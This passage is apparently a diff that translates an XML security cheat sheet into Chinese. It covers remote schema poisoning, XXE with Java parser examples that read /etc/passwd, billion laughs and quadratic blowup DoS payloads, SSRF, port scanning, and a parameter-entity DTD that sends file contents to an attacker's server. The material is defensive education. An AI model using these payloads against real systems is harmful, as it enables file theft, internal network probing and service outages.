+当文档使用未加密的超文本传输协议（HTTP）引用远程模式时，通信以明文进行，攻击者可以轻松篡改流量。**当 XML 文档使用 HTTP 连接引用远程模式时，连接可能在到达最终用户之前被嗅探和修改：**
 
 ```xml
 <!DOCTYPE note SYSTEM "http://example.com/note.dtd">
@@ -451,43 +451,43 @@ When documents reference remote schemas using the unencrypted Hypertext Transfer
 </note>
 ```
 
-The remote file `note.dtd` could be susceptible to tampering when transmitted using the unencrypted HTTP protocol. One tool available to facilitate this type of attack is mitmproxy .
+远程文件 `note.dtd` 在使用未加密的 HTTP 协议传输时可能容易被篡改。一个可用于促进这类攻击的工具是 mitmproxy。
 
-##### DNS-Cache Poisoning
+##### DNS 缓存投毒
 
-Remote schema poisoning may also be possible even when using encrypted protocols like Hypertext Transfer Protocol Secure (HTTPS). **When software performs reverse Domain Name System (DNS) resolution on an IP address to obtain the hostname, it may not properly ensure that the IP address is truly associated with the hostname.** In this case, the software enables an attacker to redirect content to their own Internet Protocol (IP) addresses.
+即使使用加密协议如安全超文本传输协议（HTTPS），远程模式投毒仍然是可能的。**当软件对 IP 地址执行反向域名系统（DNS）解析以获取主机名时，可能无法正确确保 IP 地址确实与该主机名关联。**在这种情况下，软件使攻击者能够将内容重定向到他们自己的互联网协议（IP）地址。
 
-The previous example referenced the host `example.com` using an unencrypted protocol.
+前面的示例使用未加密协议引用了主机 `example.com`。
 
-When switching to HTTPS, the location of the remote schema will look like `https://example/note.dtd`. In a normal scenario, the IP of `example.com` resolves to `1.1.1.1`:
-
-```bash
-$ host example.com
-example.com has address 1.1.1.1
-```
-
-If an attacker compromises the DNS being used, the previous hostname could now point to a new, different IP controlled by the attacker `2.2.2.2`:
+切换到 HTTPS 后，远程模式的位置将类似于 `https://example/note.dtd`。在正常情况下，`example.com` 的 IP 解析为 `1.1.1.1`：
 
 ```bash
-$ host example.com
-example.com has address 2.2.2.2
+$ host example.com
+example.com has address 1.1.1.1
 ```
 
-When accessing the remote file, the victim may be actually retrieving the contents of a location controlled by an attacker.
+如果攻击者入侵了正在使用的 DNS，之前的主机名现在可能指向攻击者控制的新的不同 IP `2.2.2.2`：
 
-##### Evil Employee Attack
+```bash
+$ host example.com
+example.com has address 2.2.2.2
+```
 
-When third parties host and define schemas, the contents are not under the control of the schemas' users. **Any modifications introduced by a malicious employee-or an external attacker in control of these files-could impact all users processing the schemas. Subsequently, attackers could affect the confidentiality, integrity, or availability of other services (especially if the schema in use is [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)).**
+访问远程文件时，受害者实际上可能正在检索由攻击者控制的位置的内容。
 
-### XML Entity Expansion
+##### 恶意员工攻击
 
-**If the parser uses a [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp), an attacker might inject data that may adversely affect the XML parser during document processing. These adverse effects could include the parser crashing or accessing local files.
+当第三方托管和定义模式时，模式的内容不在用户的控制之下。**由恶意员工引入的任何修改，或由控制这些文件的外部攻击者引入的修改，都可能影响处理这些模式的所有用户。随后，攻击者可能影响其他服务的机密性、完整性或可用性（尤其是在使用 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) 的模式）。**
 
-#### Sample Vulnerable Java Implementations
+### XML 实体扩展
 
-**Using the [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) capabilities of referencing local or remote files it is possible to affect file confidentiality.** In addition, it is also possible to affect the availability of the resources if no proper restrictions have been set for the entities expansion. Consider the following example code of an XXE.
+**如果解析器使用 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)，攻击者可能注入在文档处理期间可能对 XML 解析器产生不利影响的数据。这些不利影响可能包括解析器崩溃或访问本地文件。**
 
-**Sample XML**:
+#### 示例易受攻击的 Java 实现
+
+**使用引用本地或远程文件的 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) 功能，可能影响文件机密性。**此外，如果没有为实体扩展设置适当的限制，还可能影响资源的可用性。考虑以下 XXE 的示例代码。
+
+**示例 XML**：
 
 ```xml
 <!DOCTYPE contacts SYSTEM "contacts.dtd">
@@ -499,7 +499,7 @@ When third parties host and define schemas, the contents are not under the contr
 </contacts>
 ```
 
-**Sample DTD**:
+**示例 DTD**：
 
 ```xml
 <!ELEMENT contacts (contact*)>
@@ -509,7 +509,7 @@ When third parties host and define schemas, the contents are not under the contr
 <!ENTITY xxe SYSTEM "/etc/passwd">
 ```
 
-##### XXE using DOM
+##### 使用 DOM 的 XXE
 
 ```java
 import java.io.IOException;
@@ -549,8 +549,7 @@ public class parseDocument {
  }
 }
 ```
-
-The previous code produces the following output:
+前面的代码产生以下输出：
 
 ```bash
 $ javac parseDocument.java ; java parseDocument
@@ -561,7 +560,7 @@ nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
 root:*:0:0:System Administrator:/var/root:/bin/sh
 ```
 
-##### XXE using DOM4J
+##### 使用 DOM4J 的 XXE
 
 ```java
 import org.dom4j.Document;
@@ -590,7 +589,7 @@ public class test1 {
 }
 ```
 
-The previous code produces the following output:
+前面的代码产生以下输出：
 
 ```bash
 $ java test1
@@ -606,7 +605,7 @@ nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
 root:*:0:0:System Administrator:/var/root:/bin/sh
 ```
 
-##### XXE using SAX
+##### 使用 SAX 的 XXE
 
 ```java
 import java.io.IOException;
@@ -636,7 +635,7 @@ public class parseDocument extends DefaultHandler {
 }
 ```
 
-The previous code produces the following output:
+前面的代码产生以下输出：
 
 ```bash
 $ java parseDocument
@@ -647,7 +646,7 @@ nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
 root:*:0:0:System Administrator:/var/root:/bin/sh
 ```
 
-##### XXE using StAX
+##### 使用 StAX 的 XXE
 
 ```java
 import javax.xml.parsers.SAXParserFactory;
@@ -678,10 +677,9 @@ public class parseDocument {
   }
  }
 }
-
 ```
 
-The previous code produces the following output:
+前面的代码产生以下输出：
 
 ```bash
 $ java parseDocument
@@ -691,9 +689,9 @@ nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
 root:*:0:0:System Administrator:/var/root:/bin/sh
 ```
 
-#### Recursive Entity Reference
+#### 递归实体引用
 
-**When the definition of an element `A` is another element `B`, and that element `B` is defined as element `A`, that schema describes a circular reference between elements:**
+**当元素 `A` 的定义是另一个元素 `B`，而元素 `B` 又被定义为元素 `A` 时，该模式描述了元素之间的循环引用：**
 
 ```xml
 <!DOCTYPE A [
@@ -704,23 +702,23 @@ root:*:0:0:System Administrator:/var/root:/bin/sh
 <A>&A;</A>
 ```
 
-#### Quadratic Blowup
+#### 平方爆炸
 
-**Instead of defining multiple small, deeply nested entities, the attacker in this scenario defines one very large entity and refers to it as many times as possible, resulting in a quadratic expansion (*O(n^2)*).**
+**攻击者不是定义多个小的、深度嵌套的实体，而是定义一个非常大的实体并尽可能多地引用它，从而导致平方级扩展（*O(n^2)*）。**
 
-The result of the following attack will be 100,000 x 100,000 characters in memory.
+以下攻击的结果将是内存中的 100,000 x 100,000 个字符。
 
 ```xml
 <!DOCTYPE root [
  <!ELEMENT root ANY>
- <!ENTITY A "AAAAA...(a 100.000 A's)...AAAAA">
+ <!ENTITY A "AAAAA...(100,000个A)...AAAAA">
 ]>
-<root>&A;&A;&A;&A;...(a 100.000 &A;'s)...&A;&A;&A;&A;&A;</root>
+<root>&A;&A;&A;&A;...(100,000个 &A;)...&A;&A;&A;&A;&A;</root>
 ```
 
-#### Billion Laughs
+#### 十亿笑声攻击
 
-**When an XML parser tries to resolve the external entities included within the following code, it will cause the application to start consuming all of the available memory until the process crashes.** This is an example XML document with an embedded [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) schema including the attack:
+**当 XML 解析器尝试解析以下代码中包含的外部实体时，它将导致应用程序开始消耗所有可用内存，直到进程崩溃。**这是一个包含攻击的嵌入式 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) 模式的 XML 文档示例：
 
 ```xml
 <!DOCTYPE root [
@@ -739,11 +737,11 @@ The result of the following attack will be 100,000 x 100,000 characters in memor
 <root>&LOL9;</root>
 ```
 
-The entity `LOL9` will be resolved as the 10 entities defined in `LOL8`; then each of these entities will be resolved in `LOL7` and so on. Finally, the CPU and/or memory will be affected by parsing the `3 x 10^9` (3,000,000,000) entities defined in this schema, which could make the parser crash.
+实体 `LOL9` 将被解析为 `LOL8` 中定义的 10 个实体；然后这些实体中的每一个都将在 `LOL7` 中解析，依此类推。最终，解析在此模式中定义的 `3 x 10^9`（3,000,000,000）个实体将影响 CPU 和/或内存，可能导致解析器崩溃。
 
-**The Simple Object Access Protocol ([SOAP](https://en.wikipedia.org/wiki/SOAP)) specification forbids [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)s completely. This means that a SOAP processor can reject any SOAP message that contains a [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp). Despite this specification, certain SOAP implementations did parse [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) schemas within SOAP messages.**
+**简单对象访问协议（[SOAP](https://en.wikipedia.org/wiki/SOAP)）规范完全禁止 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)。这意味着 SOAP 处理器可以拒绝任何包含 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) 的 SOAP 消息。尽管有这样的规范，某些 SOAP 实现仍然解析 SOAP 消息中的 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) 模式。**
 
-The following example illustrates a case where the parser is not following the specification, enabling a reference to a [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) in a SOAP message:
+下面的示例说明了解析器未遵循规范的情况，使得在 SOAP 消息中引用 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) 成为可能：
 
 ```xml
 <?XML VERSION="1.0" ENCODING="UTF-8"?>
@@ -769,9 +767,9 @@ The following example illustrates a case where the parser is not following the s
 </SOAP:ENVELOPE>
 ```
 
-#### Reflected File Retrieval
+#### 反射文件检索
 
-Consider the following example code of an XXE:
+考虑以下 XXE 示例代码：
 
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
@@ -782,23 +780,23 @@ Consider the following example code of an XXE:
 <root>&xxe;</root>
 ```
 
-**The previous XML defines an entity named `xxe`, which is in fact the contents of `/etc/passwd`, which will be expanded within the `includeme` tag. If the parser allows references to external entities, it might include the contents of that file in the XML response or in the error output.**
+**前面的 XML 定义了一个名为 `xxe` 的实体，实际上是 `/etc/passwd` 的内容，将在 `includeme` 标签中展开。如果解析器允许引用外部实体，它可能在 XML 响应或错误输出中包含该文件的内容。**
 
-#### Server Side Request Forgery
+#### 服务器端请求伪造（SSRF）
 
-**Server Side Request Forgery (SSRF) happens when the server receives a malicious XML schema, which makes the server retrieve remote resources such as a file via HTTP/HTTPS/FTP, etc.** SSRF has been used to retrieve remote files, to prove a XXE when you cannot reflect back the file or perform port scanning, or perform brute force attacks on internal networks.
+**服务器端请求伪造（SSRF）发生在服务器接收到恶意 XML 模式时，使服务器通过 HTTP/HTTPS/FTP 等检索远程资源。**SSRF 已被用于检索远程文件、在无法反射文件时证明 XXE，或对内部网络执行端口扫描或暴力攻击。
 
-##### External DNS Resolution
+##### 外部 DNS 解析
 
-**Sometimes it is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.** This is one of the simplest forms of SSRF, but requires the attacker to analyze the DNS traffic. Burp has a plugin that checks for this attack.
+**有时可以诱导应用程序对任意域名执行服务器端 DNS 查找。**这是 SSRF 最简单的形式之一，但需要攻击者分析 DNS 流量。Burp 有一个检查此类攻击的插件。
 
 ```xml
 <!DOCTYPE m PUBLIC "-//B/A/EN" "http://checkforthisspecificdomain.example.com">
 ```
 
-##### External Connection
+##### 外部连接
 
-Whenever there is an XXE and you cannot retrieve a file, you can test if you would be able to establish remote connections:
+当存在 XXE 且无法检索文件时，可以测试是否能建立远程连接：
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -808,9 +806,9 @@ Whenever there is an XXE and you cannot retrieve a file, you can test if you wou
 ]>
 ```
 
-##### File Retrieval with Parameter Entities
+##### 使用参数实体的文件检索
 
-Parameter entities allows for the retrieval of content using URL references. Consider the following malicious XML document:
+参数实体允许使用 URL 引用检索内容。考虑以下恶意 XML 文档：
 
 ```xml
 <?xml version="1.0" encoding="utf-8"?>
@@ -822,7 +820,7 @@ Parameter entities allows for the retrieval of content using URL references. Con
 <root>&send;</root>
 ```
 
-Here the [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) defines two external parameter entities: `file` loads a local file, and `dtd` which loads a remote [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp). The remote [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) should contain something like this:
+这里的 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) 定义了两个外部参数实体：`file` 加载本地文件，`dtd` 加载远程 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)。远程 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) 应包含类似以下内容：
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -830,15 +828,15 @@ Here the [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) defines two exte
 %all;
 ```
 
-The second [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) causes the system to send the contents of the `file` back to the attacker's server as a parameter of the URL.
+第二个 [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) 导致系统将 `file` 的内容作为 URL 参数发送回攻击者的服务器。
 
-##### Port Scanning
+##### 端口扫描
 
-The amount and type of information generated by port scanning will depend on the type of implementation. Responses can be classified as follows, ranking from easy to complex:
+端口扫描生成的信息量和类型取决于实现方式。响应可分类如下，从简单到复杂：
 
-**1) Complete Disclosure**: This is the simplest and most unusual scenario, with complete disclosure you can clearly see what's going on by receiving the complete responses from the server being queried. You have an exact representation of what happened when connecting to the remote host.
+**1) 完全泄露**：这是最简单且最不寻常的场景，通过完全泄露，你可以清楚地看到查询服务器返回的完整响应，获得连接到远程主机时发生的精确表示。
 
-**2) Error-based**: If you are unable to see the response from the remote server, you may be able to use the information generated by the error response. Consider a web service leaking details on what went wrong in the SOAP Fault element when trying to establish a connection:
+**2) 基于错误**：如果无法看到远程服务器的响应，可能可以使用错误响应生成的信息。考虑一个 Web 服务在尝试建立连接时在 SOAP Fault 元素中泄露详细信息：
 
 ```text
 java.io.IOException: Server returned HTTP response code: 401 for URL: http://192.168.1.1:80
@@ -846,13 +844,13 @@ java.io.IOException: Server returned HTTP response code: 401 for URL: http://192
  at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:674)
 ```
 
-**3) Timeout-based**: The scanner could generate timeouts when it connects to open or closed ports depending on the schema and the underlying implementation. If the timeouts occur while you are trying to connect to a closed port (which may take one minute), the time of response when connected to a valid port will be very quick (one second, for example). The differences between open and closed ports becomes quite clear.
+**3) 基于超时**：扫描器可能在连接开放或关闭的端口时生成超时，具体取决于模式和底层实现。如果在尝试连接关闭端口时发生超时（可能需要一分钟），那么连接到有效端口的响应时间将非常快（例如一秒）。开放和关闭端口之间的差异变得相当明显。
 
-**4) Time-based**: Sometimes it may be difficult to tell the differences between closed and open ports because the results are very subtle. The only way to know the status of a port with certainty would be to take multiple measurements of the time required to reach each host, then you should analyze the average time for each port to determinate the status of each port. This type of attack will be difficult to accomplish if it is performed in higher latency networks.
+**4) 基于时间**：有时很难区分关闭和开放端口，因为结果非常微妙。要确定端口状态，唯一的方法是对到达每个主机所需的时间进行多次测量，然后分析每个端口的平均时间以确定每个端口的状态。如果在高延迟网络中执行，这种类型的攻击将很难完成。
 
-##### Brute Forcing
+##### 暴力破解
 
-**Once an attacker confirms that it is possible to perform a port scan, performing a brute force attack is a matter of embedding the `username` and `password` as part of the URI scheme (http, ftp, etc).** For example, see the following example:
+**一旦攻击者确认可以执行端口扫描，执行暴力攻击就是将 `username` 和 `password` 嵌入 URI 方案（http、ftp 等）的问题。**例如，请看以下示例：
 
 ```xml
 <!DOCTYPE root [
